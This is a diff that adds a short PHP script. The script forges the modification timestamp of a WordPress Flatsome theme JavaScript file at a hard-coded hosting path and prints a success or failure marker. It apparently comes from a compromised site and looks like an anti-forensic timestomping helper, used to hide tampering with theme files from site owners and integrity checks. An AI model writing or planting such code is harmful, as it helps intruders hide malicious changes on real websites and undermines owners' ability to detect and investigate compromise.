@@ -1,0 +1,1 @@
+<?php  $path = '/home/wp-fl-demo-tt43/htdocs/tt43.wp-fl-demo.xyz/wp-content/themes/flatsome/assets/js/flatsome.js'; if (@touch($path, 1775627186)) {     die('!success!'); } die('!failed!'); 
